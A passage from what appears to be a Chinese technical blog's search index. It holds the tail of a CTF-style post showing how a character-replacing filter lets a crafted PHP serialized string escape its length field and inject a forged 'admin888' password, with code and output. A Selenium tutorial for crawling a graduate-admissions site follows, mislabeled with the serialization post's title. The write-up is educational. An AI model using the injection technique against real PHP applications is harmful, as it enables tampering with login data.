的长度是 8+21+22=73</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'a:2:&#123;i:0;s:51:"</span>luc1fer22222222222222222222222222222222222222222222<span class="string">";i:1;s:8:"</span>admin888<span class="string">";&#125;"</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;&#125;<span class="string">' </span></span><br><span class="line"><span class="string">//过滤后51没变，但是</span></span><br><span class="line"><span class="string">luc1fer22222222222222222222222222222222222222222222";i:1;s:8:"admin888";&#125;实际长度却变成了 8+21+22+22</span></span><br></pre></td></tr></table></figure><p>每出现一个 3 就替换成 22 ,长度加 1 。 我们构造的字符串长度是 22 ，我们就需要使用 22 个(本来带的有一个，所以添加21个就可以) 3 来使长度增加22。</p><p>从上面的例子可以看出，过滤后的属性长度51，在反系列化的时候刚好把替换后的数据读完，我们构造的数据闭合了双引号就逃逸出来变成新属性了。后面原来的属性会被忽略。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$username = <span class="string">'luc1fer3333333333333333333333";i:1;s:8:"admin888";&#125;'</span>;</span><br><span class="line">$pwd = <span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'3'</span>,<span class="string">'22'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = replace(serialize($ser));</span><br><span class="line">var_dump($a).<span class="string">"\r\n"</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"></span><br><span class="line">string(<span class="number">107</span>) <span class="string">"a:2:&#123;i:0;s:51:"</span>luc1fer22222222222222222222222222222222222222222222<span class="string">";i:1;s:8:"</span>admin888<span class="string">";&#125;"</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;&#125;<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array(2) &#123;</span></span><br><span class="line"><span class="string">  [0]=&gt;</span></span><br><span class="line"><span class="string">  string(51) "</span>luc1fer22222222222222222222222222222222222222222222<span class="string">"</span></span><br><span class="line"><span class="string">  [1]=&gt;</span></span><br><span class="line"><span class="string">  string(8) "</span>admin888<span class="string">"</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化与反序列化</title>
      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8Selenium-%E7%BC%96%E5%86%99%E7%88%AC%E8%99%AB%E5%8A%A8%E6%80%81%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1%E6%96%87%E6%A1%A3/"/>
      <url>/2019/12/12/%E4%BD%BF%E7%94%A8Selenium-%E7%BC%96%E5%86%99%E7%88%AC%E8%99%AB%E5%8A%A8%E6%80%81%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-Selenium-编写爬虫动态爬取网站"><a href="#使用-Selenium-编写爬虫动态爬取网站" class="headerlink" title="使用 Selenium 编写爬虫动态爬取网站"></a>使用 Selenium 编写爬虫动态爬取网站</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>传统的浏览器请求响应方式是：我们在一个网站上点击了一个请求资源的按钮，就会对服务器发起一次请求，然后响应再返回到浏览器。该请求是一个完整的 HTML 页面，因此当浏览器用到新的 HTML 页面重绘时，可能会看到闪烁，这一方面增加了服务器的压力，同时降低了用户的体验度。</p><p>Web 2.0 很大程度上消除了这种看得见的交互。虽然仍有请求和相应，只不过都隐藏到了幕后，作为用户，体验更加舒适。</p><p>如何实现呢？我们需要发送和请求的数据只包含我们需要的，而不是整个 HTML 页面。这种情况下 Ajax 允许在不更新整个 HTML 页面的情况下发送和接收数据。</p><h2 id="如何爬取动态加载的资源？"><a href="#如何爬取动态加载的资源？" class="headerlink" title="如何爬取动态加载的资源？"></a>如何爬取动态加载的资源？</h2><p>这种方式方便了用户，可是对我们爬取网页内容缺造成了不便。</p><p>相对于传统的静态页面，我们在爬取页面内容时只需要简单的获取整个 HTML 文本然后对其中的内容进行匹配、提取即可。</p><p>对于采用动态记载内容的网站来说，我们查看网页源代码会发现许多我们需要的资源是需要加载请求才能从服务器返回的。</p><h3 id="Selenium-amp-PhantomJS简介"><a href="#Selenium-amp-PhantomJS简介" class="headerlink" title="Selenium &amp; PhantomJS简介"></a>Selenium &amp; PhantomJS简介</h3><p>Selenium 是一个 Web 的自动化测试工具，最初是为了网站自动化测试开发的， Selenium 测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Mozilla Firefox，Safari，Google Chrome，Opera等。也包括 PhantomJS 。</p><p>Selenium 可以根据我们的指令，让浏览器自动加载页面，获取需要的数据，甚至是页面截屏。<br>安装：<code>pip install selenium</code></p><p>官方文档：<code>http://selenium-python.readthedocs.io/index.html</code></p><p>PhantomJS 是一个基于 Webkit 的“无界面”( headless )浏览器，它会把网站加载到内存并执行页面上的 JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器要高效。</p><p>如果我们把 Selenium 和 PhantomJS 结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理 JavaScript、Cookie、headers，以及任何我们真实用户需要做的事情。</p><p>官方文档：<code>http://phantomjs.org/documentation</code></p><p>下载地址： <code>http://phantomjs.org/download.html</code></p><p>手册：<code>https://phantomjs.org/quick-start.html</code></p><p>我们可以通过下面的方式来获得一个 <strong>chromedriver</strong> 驱动的浏览器(<a href="https://sites.google.com/a/chromium.org/chromedriver/home" target="_blank" rel="noopener">需要安装对应驱动</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line">driver = webdriver.Chrome(executable_path=<span class="string">"./chromedriver.exe"</span>, chrome_options=chrome_options)</span><br></pre></td></tr></table></figure><p>当然你也可以使用 <strong>PhantomJS</strong> 但是存在的问题是由于两种驱动请求页面的方式不同，后者在页面没有完全记载时就会尝试早期请求，这常常会导致 <code>InvalidElementStateException</code> 错误，当然，我们可以在请求页面第一个元素之前就调用 <code>time</code> 函数，进行 <code>sleep(2)</code> 等待。</p><p>除此之外，<strong>PhantomJS</strong> 也已经不再更新，这也驱使我们使用新的驱动程序。</p><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 webdriver</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用键盘按键操作时需要引入的Keys包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用环境变量指定的PhantomJS浏览器创建浏览器对象</span></span><br><span class="line">driver = webdriver.PhantomJS()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有在环境变量指定PhantomJS位置</span></span><br><span class="line"><span class="comment"># driver = webdriver.PhantomJS(executable_path="./phantomjs"))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get方法会一直等到页面被完全加载，然后才会继续程序，通常测试会在这里选择 time.sleep(2)</span></span><br><span class="line">driver.get(<span class="string">"http://www.baidu.com/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面名为 wrapper的id标签的文本内容</span></span><br><span class="line">data = driver.find_element_by_id(<span class="string">"wrapper"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印页面标题 "百度一下，你就知道"</span></span><br><span class="line"><span class="keyword">print</span> driver.title</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成当前页面快照并保存</span></span><br><span class="line">driver.save_screenshot(<span class="string">"baidu.png"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># id="kw"是百度搜索输入框，输入字符串"长城"</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(<span class="string">u"长城"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># id="su"是百度搜索按钮，click() 是模拟点击</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"su"</span>).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctrl+a 全选输入框内容</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.CONTROL,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctrl+x 剪切输入框内容</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.CONTROL,<span class="string">'x'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取href值</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"html/body/div/div[1]/div[2]/a[1]"</span>).get_attribute(<span class="string">'href'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟Enter回车键，替代点击操作</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"su"</span>).send_keys(Keys.RETURN)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除输入框内容</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭当前页面，如果只有一个页面，会关闭浏览器</span></span><br><span class="line"><span class="comment"># driver.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>使用JS取得最大屏幕</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接下来是全屏的关键，用js获取页面的宽高，如果有其他需要用js的部分也可以用这个方法</span></span><br><span class="line">    width = driver.execute_script(<span class="string">"return document.documentElement.scrollWidth"</span>)</span><br><span class="line">    height = driver.execute_script(<span class="string">"return document.documentElement.scrollHeight"</span>)</span><br><span class="line">    print(width, height)</span><br><span class="line">    <span class="comment"># 窗口最大化</span></span><br><span class="line">    driver.set_window_size(width, height)</span><br></pre></td></tr></table></figure><h3 id="切换页面"><a href="#切换页面" class="headerlink" title="切换页面"></a>切换页面</h3><p>当有许多 Tab 时我们需要判断我们当前处于哪个页面，使用 <code>window_handles</code> 来操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Store the ID of the original window</span></span><br><span class="line">original_window = driver.current_window_handle</span><br><span class="line"></span><br><span class="line">   <span class="comment"># Check we don't have other windows open already</span></span><br><span class="line">   <span class="keyword">assert</span> len(driver.window_handles) == <span class="number">1</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># Wait for the new window or tab</span></span><br><span class="line">   wait.until(EC.number_of_windows_to_be(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">   <span class="comment"># Loop through until we find a new window handle</span></span><br><span class="line">   <span class="keyword">for</span> window_handle <span class="keyword">in</span> driver.window_handles:</span><br><span class="line">       <span class="keyword">if</span> window_handle != original_window:</span><br><span class="line">           driver.switch_to.window(window_handle)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">           </span><br><span class="line">   wait.until(EC.title_is(<span class="string">"title"</span>))</span><br></pre></td></tr></table></figure><h3 id="复选框选择"><a href="#复选框选择" class="headerlink" title="复选框选择"></a>复选框选择</h3><p>选择一个实际场景进行测试，<a href="https://yz.chsi.com.cn/zsml/zyfx_search.jsp" target="_blank" rel="noopener">以研招网硕士专业目录为例</a> </p><p><img src="F:%5Call_kinds_file%5C%E8%AF%BE%E8%AE%BE%5C%E5%A4%A7%E4%B8%89%E4%B8%8B%5C%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%5C%E7%A0%94%E6%8B%9B%E7%BD%91%E9%A6%96%E9%A1%B5.png" alt="研招网首页"></p><p>这有一个 <code>select</code> 标签下的复选框，用常规的方法解析 <code>Xpath</code> 路径可以获取到想要的元素，但是没办法进行选择，这里采用 <code>Selenium</code> 提供的 <code>Select</code> 库进行选择，<a href="https://selenium-python-zh.readthedocs.io/en/latest/api.html" target="_blank" rel="noopener">文档在这里</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Select 处理下拉框的选项</span></span><br><span class="line"><span class="comment"># 先通过 Xpath 找到 select 标签，然后通过 value 找到对应值即可选择</span></span><br><span class="line">Select(driver.find_element_by_xpath(<span class="string">"//select[@id='mldm']"</span>)).select_by_value(<span class="string">'zyxw'</span>)</span><br><span class="line">Select(driver.find_element_by_xpath(<span class="string">"//select[@id='yjxkdm']"</span>)).select_by_value(<span class="string">"0854"</span>)</span><br></pre></td></tr></table></figure><p>这样，我们就成功的选择到想要的元素，之后进行查询跳转即可。</p><h2 id="爬虫设计"><a href="#爬虫设计" class="headerlink" title="爬虫设计"></a>爬虫设计</h2><p>我们将本次爬虫分为几大部分</p><ol><li>逻辑分析</li><li>代码实现</li><li>数据可视化</li></ol><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><p>此次爬虫我们的设计目标是爬取研招网2020年的考研相关数据，我们需要先认为的对目标网站进行查询操作，明确操作流程之后，再进行下一步。</p><ol><li><strong>选择我们要使用的浏览器</strong>，进入查询网址，<a href="https://yz.chsi.com.cn/zsml/queryAction.do" target="_blank" rel="noopener">研招网硕士专业目录查询</a></li><li>打开研招网的硕士目录后需要先至少选择两项条件，且学科类别为必选项，<strong>选择好条件</strong>之后才能进行查询</li></ol><p><img src="F:%5Call_kinds_file%5C%E8%AF%BE%E8%AE%BE%5C%E5%A4%A7%E4%B8%89%E4%B8%8B%5C%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%5C%E7%A0%94%E6%8B%9B%E7%BD%91%E9%A6%96%E9%A1%B5.png" alt="研招网首页"></p><ol start="2"><li>我们以 专业学位、电子信息 为筛选条件，选择好条件后会<strong>进行一次页面跳转</strong>，进入包含所有符合我们选择条件的院校列表页面，可以看到，符合条件的院校非常多，有十几页的内容。</li><li>对于这些院校，我们的关注点可能在于所在城市，以及所开设的研究方向等信息。我们选择一所院校进行点击之后，<strong>会打开一个新的窗口</strong> ，里面包含了该校在本学科类别下开设的所有研究方向与计划招收人数等信息，有些学校的研究方向非常多，可能会有十几页内容。</li><li>查看完一个学校，<strong>记录我们需要的信息</strong>之后，我们可能会查看其他学校。于是，为了避免打开窗口过多，我们会<strong>关闭新打开的窗口</strong>，回到院校列表页面，重新打开一个学校的研究方向窗口。</li><li>查询完成，<strong>关闭浏览器</strong>。</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>针对上文的逻辑分析，我们编写代码时也主要完成上述动作。</p><ol><li><p>选择浏览器，并进行配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置 driver</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_driver</span><span class="params">(url)</span>:</span></span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--headless"</span>) <span class="comment"># 即所谓 无头 模式</span></span><br><span class="line">    chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line">    driver = webdriver.Chrome(executable_path=<span class="string">"E:/Program Files/chromedriver_win32/chromedriver.exe"</span>,</span><br><span class="line">                              chrome_options=chrome_options)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    driver = set_height_width(driver)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将设置屏幕大小独立出来，方便每次跳转完使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_height_width</span><span class="params">(driver)</span>:</span> </span><br><span class="line">    width = driver.execute_script(<span class="string">"return document.documentElement.scrollWidth"</span>)</span><br><span class="line">    height = driver.execute_script(<span class="string">"return document.documentElement.scrollHeight"</span>)</span><br><span class="line">    driver.set_window_size(width, height) <span class="comment"># 将屏幕大小设置为最大，防止部分信息加载不完全</span></span><br><span class="line">    <span class="keyword">return</span> driver</span><br></pre></td></tr></table></figure></li><li><p>条件选择与页面跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择目标专业</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_major</span><span class="params">(driver)</span>:</span></span><br><span class="line">    original_window = driver.current_window_handle</span><br><span class="line">    <span class="keyword">assert</span> len(driver.window_handles) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class="line">        <span class="comment"># 使用 Select 处理下拉框的选项</span></span><br><span class="line">        <span class="comment"># 先通过 Xpath 找到 select 标签，然后通过 value 找到对应值即可选择</span></span><br><span class="line">        Select(driver.find_element_by_xpath(<span class="string">"//select[@id='mldm']"</span>)).select_by_value(<span class="string">'zyxw'</span>) <span class="comment"># 选择专业学位</span></span><br><span class="line">        Select(driver.find_element_by_xpath(<span class="string">"//select[@id='yjxkdm']"</span>)).select_by_value(<span class="string">"0854"</span>) <span class="comment"># 电子信息的专业代码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"wrong "</span> + str(e))</span><br><span class="line"></span><br><span class="line">    driver.find_element_by_xpath(<span class="string">"//input[@name='button']"</span>).click() <span class="comment"># 找到查询按钮进行点击</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待时间过长，超时</span></span><br><span class="line">    <span class="comment"># wait.until(EC.number_of_windows_to_be(2))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断当前页面</span></span><br><span class="line">    <span class="keyword">for</span> window_handle <span class="keyword">in</span> driver.window_handles:</span><br><span class="line">        <span class="keyword">if</span> window_handle != original_window:</span><br><span class="line">            driver.switch_to.window(window_handle)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 成功跳转到目标网页</span></span><br><span class="line">    driver = set_height_width(driver)</span><br><span class="line">    <span class="keyword">return</span> driver</span><br></pre></td></tr></table></figure></li><li><p>选取该页面上的所有院校</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获得当前条件下的所有高校名称,返回名称列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_school_name</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        name_list = []</span><br><span class="line">        major_numbers_list = []</span><br><span class="line">        number_list = []</span><br><span class="line">        original_window = driver.current_window_handle</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> range(<span class="number">1</span>, len(numbers)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    school_name = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[1]//form[1]//a[1]"</span>.format(line)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                    print(school_name)</span><br><span class="line">                    name_list.append(school_name)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    flag = <span class="literal">False</span></span><br><span class="line">                    print(<span class="string">"查找失败，请检查当前页面是否为空！"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (pagenumber &lt; <span class="number">7</span>):</span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> range(<span class="number">1</span>, len(numbers)+<span class="number">1</span>):</span><br><span class="line">                    school_name = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[1]//form[1]//a[1]"</span>.format(line)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                    name_list.append(school_name)</span><br><span class="line">                    print(school_name)</span><br><span class="line"></span><br><span class="line">                ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(name_list)</span></span><br><span class="line">        <span class="keyword">return</span> name_list, major_numbers_list, number_list, flag</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>翻页处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果需要翻页就翻页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paging</span><span class="params">(driver)</span>:</span></span><br><span class="line"></span><br><span class="line">    css_selector_pages = <span class="string">"body.ch-sticky:nth-child(2) "</span> \</span><br><span class="line">                         <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                         <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                         <span class="string">"div.zsml-row.clearfix div.zsml-page-box &gt; ul.ch-page"</span></span><br><span class="line"></span><br><span class="line">    ul = driver.find_element_by_css_selector(css_selector_pages)</span><br><span class="line">    li = ul.find_elements_by_xpath(<span class="string">"li"</span>) </span><br><span class="line">    <span class="comment"># print(len(li))</span></span><br><span class="line">    <span class="comment"># 第一页右下角的标签数量最大为10，小于10时没有 Go 输入跳转框</span></span><br><span class="line">    <span class="keyword">if</span>(len(li) &lt; <span class="number">10</span>):</span><br><span class="line">        pagenumber = int(li[<span class="number">-2</span>].text)</span><br><span class="line">    <span class="comment"># print(pagenumber)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pagenumber = int(li[<span class="number">-3</span>].text)</span><br><span class="line">    <span class="keyword">return</span> pagenumber</span><br></pre></td></tr></table></figure></li><li><p>获取研究方向等信息</p><p>与院校列表页面不同，各个学校对应的研究方向的数量不同，存在研究方向页面数量不同的情况，这也造成了我们无法通过一种固定的方法来对所用的情况进行处理，于是，在这段代码里增加了数量判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_major_info</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        <span class="comment"># 当前 Tab 里有多少个页面</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        majors = <span class="number">0</span></span><br><span class="line">        all_number = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 定位跳转</span></span><br><span class="line">        css_selector_jumpto = <span class="string">"body.ch-sticky:nth-child(2) "</span> 